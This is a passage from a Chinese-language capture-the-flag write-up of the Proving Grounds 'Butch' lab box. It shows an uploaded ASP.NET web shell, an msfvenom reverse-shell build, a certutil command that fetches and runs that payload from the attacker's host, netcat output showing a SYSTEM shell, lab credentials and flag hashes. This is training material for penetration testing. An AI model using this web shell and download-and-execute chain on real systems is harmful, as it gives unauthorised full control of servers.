+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Butch</span> <span class="n">Repository</span><span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;main&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">asp</span><span class="p">:</span><span class="n">contentplaceholder</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;ContentPlaceHolder1&#34;</span> <span class="n">runat</span><span class="p">=</span><span class="s">&#34;server&#34;</span><span class="p">&gt;&lt;/</span><span class="n">asp</span><span class="p">:</span><span class="n">contentplaceholder</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="n">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">stdout</span> <span class="p">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">cmd</span> <span class="p">=</span> <span class="s">&#34;whoami&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">ProcessStartInfo</span> <span class="n">procStartInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">ProcessStartInfo</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">,</span> <span class="s">&#34;/c &#34;</span> <span class="p">+</span> <span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">procStartInfo</span><span class="p">.</span><span class="n">RedirectStandardOutput</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">procStartInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">procStartInfo</span><span class="p">.</span><span class="n">CreateNoWindow</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span> <span class="p">=</span> <span class="n">procStartInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout</span> <span class="p">=</span> <span class="n">p</span><span class="p">.</span><span class="n">StandardOutput</span><span class="p">.</span><span class="n">ReadToEnd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">%&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这么做的好处在于不会让环境崩溃，无需重置环境。</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212212822461.png" alt="image-20240212212822461" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212212822461.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212212822461.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212212822461.png?size=large 2x" data-title="image-20240212212822461" style="--width: 1263px;--aspect-ratio: 1263 / 845;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>上传成功后，刷新当前页面，会在网页底部输出 whoami的命令执行结果。</p>
+<p>注意，第一次上传后需要刷新页面，或者用Get方式访问当前页才有命令执行结果，上图中是因为已经是第二次上传了。</p>
+<p>接下去替换命令内容，下载由MSFVenom生产的shell.exe，并执行获取反弹shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.49.65 <span class="nv">LPORT</span><span class="o">=</span><span class="m">450</span> -f exe -o shell.exe
+</span></span><span class="line"><span class="cl">$ sudo python3 -m http.server <span class="m">445</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">string <span class="nv">stdout</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">ArrayList <span class="nv">commands</span> <span class="o">=</span> new ArrayList<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">commands.Add<span class="o">(</span><span class="s2">&#34;certutil.exe -urlcache -split -f \&#34;http://192.168.49.65:445/shell.exe\&#34; \&#34;C:\\inetpub\\wwwroot\\shell.exe\&#34;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">commands.Add<span class="o">(</span><span class="s2">&#34;\&#34;C:\\inetpub\\wwwroot\\shell.exe\&#34;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">foreach <span class="o">(</span>string cmd in commands<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">	System.Threading.Thread.Sleep<span class="o">(</span>3000<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	System.Diagnostics.ProcessStartInfo <span class="nv">procStartInfo</span> <span class="o">=</span> new System.Diagnostics.ProcessStartInfo<span class="o">(</span><span class="s2">&#34;cmd&#34;</span>, <span class="s2">&#34;/c &#34;</span> + cmd<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	procStartInfo.RedirectStandardOutput <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">	procStartInfo.UseShellExecute <span class="o">=</span> false<span class="p">;</span>
+</span></span><span class="line"><span class="cl">	procStartInfo.CreateNoWindow <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">	System.Diagnostics.Process <span class="nv">p</span> <span class="o">=</span> new System.Diagnostics.Process<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	p.StartInfo <span class="o">=</span> procStartInfo<span class="p">;</span>
+</span></span><span class="line"><span class="cl">	p.Start<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">stdout</span> <span class="o">=</span> p.StandardOutput.ReadToEnd<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	Response.Write<span class="o">(</span>stdout<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">%&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>nc监听450端口，获取反弹Shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kali@kali:~$ sudo nc -lvp <span class="m">450</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">450</span> ...
+</span></span><span class="line"><span class="cl">192.168.65.63: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.49.65<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.65.63<span class="o">]</span> <span class="m">49687</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.1217<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="flag" class="heading-element"><span>Flag</span>
+  <a href="#flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">butch/awesomedude
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">type C:\users\administrator\desktop\proof.txt
+</span></span><span class="line"><span class="cl">8efb9ecaa9dd953e25de084f5db30648
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">type C:\users\butch\desktop\local.txt
+</span></span><span class="line"><span class="cl">0f5cfaf654fe39337300f602295effb4</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-02-12 13:30:14">更新于 2024-02-12&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrounds-vault/" class="post-nav-item" rel="prev" title="ProvingGrounds Vault Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds Vault Writeup</a><a href="/posts/xz-backdoor-analysis/" class="post-nav-item" rel="next" title="XZ Utils Backdoor 事件分析汇总">XZ Utils Backdoor 事件分析汇总<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
